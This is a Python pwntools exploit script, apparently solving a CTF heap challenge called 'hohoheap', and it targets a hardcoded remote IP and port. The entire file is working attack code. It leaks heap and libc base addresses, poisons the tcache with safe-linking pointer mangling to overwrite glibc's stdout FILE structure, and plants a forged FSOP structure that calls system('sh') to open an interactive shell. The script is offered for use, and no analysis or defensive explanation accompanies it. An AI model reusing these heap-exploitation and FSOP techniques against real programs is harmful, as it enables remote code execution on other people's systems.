#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './hohoheap_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
# context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = '52.76.163.244', 5555

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
'''.format(**locals())

def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return io.sendafter(delim,data)
def sla(delim,line): return io.sendlineafter(delim,line)
def sl(line): return io.sendline(line)
def rcu(d1, d2=0):
  io.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return io.recvuntil(d2,drop=True)

def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

# =========================================================
#                         FUNCTIONS
# =========================================================

# menu 1
def add(size, content):
    sla(b': ', b'1')
    sla(b': ', str(size).encode())
    sa(b': ', content)

# menu 2
def view(idx):
    sla(b': ', b'2')
    sla(b': ', str(idx).encode())

# menu 3
def edit(idx, content):
    sla(b': ', b'3')
    sla(b': ', str(idx).encode())
    sa(b': ', content)

# menu 4
def delete(idx):
    sla(b': ', b'4')
    sla(b': ', str(idx).encode())

# menu 5
def send(idx, count):
    sla(b': ', b'5')
    sla(b': ', str(idx).encode())
    sla(b': ', str(count).encode())

# menu 6
def cheer():
    sla(b': ', b'6')

def mangle(heap_addr, val):
    return (heap_addr>>12) ^ val


# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    add(0x20, b'A'*8)  # chunk 0
    add(0x20, b'B'*8)  # chunk 1
    send(1,1) # send chunk 1
    cheer() # 
    # pause()
    view(1) # leaked addr of chunk 1

    rcu(b'Gift content: ')
    heap = u64(io.recv(6).ljust(8, b'\x00')) << 12 # heap base = leaked addr << 12

    add(0x500, b'C'*8) # chunk 2
    add(0x30, b'D'*8) # chunk 3 - guard
    send(2,1) 
    cheer()
    # pause()
    view(2)
    rcu(b'Gift content: ')
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['main_arena'] - 96 # libc base = leaked addr - main_arena - 96

    success('heap base: ' + hex(heap))
    success('libc base: ' + hex(libc.address))

    # setup tcache poisoning
    add(0xf0, b'E'*8)  # chunk 4
    add(0xf0, b'F'*8)  # chunk 5 
    delete(5)
    send(4,1) # send chunk 4 
    cheer() # chunk 4 can be overwritten

    # fsop
    stdout_lock = libc.sym['_IO_stdfile_1_lock'] # gdb-peda$ info address _IO_stdfile_1_lock
    FSOP = FSOP_struct(
        flags=u64(b"\x01\x01\x01\x01;sh\x00"),
        lock=stdout_lock,
        _wide_data=libc.sym['_IO_2_1_stdout_'] - 0x10,
        _markers=libc.symbols["system"],
        _unused2=p32(0x0) + p64(0x0) + p64(libc.sym['_IO_2_1_stdout_'] - 0x8),
        vtable=libc.symbols["_IO_wfile_jumps"] - 0x20,
        _mode=0xFFFFFFFF,
    )

    edit(4, p64(mangle(heap, libc.sym['_IO_2_1_stdout_']))) # edit chunk 4
    add(0xf0,b'A*8')
    add(0xf0, bytes(FSOP))

    # pause()

    io.interactive()

    
if __name__ == '__main__':
    exploit()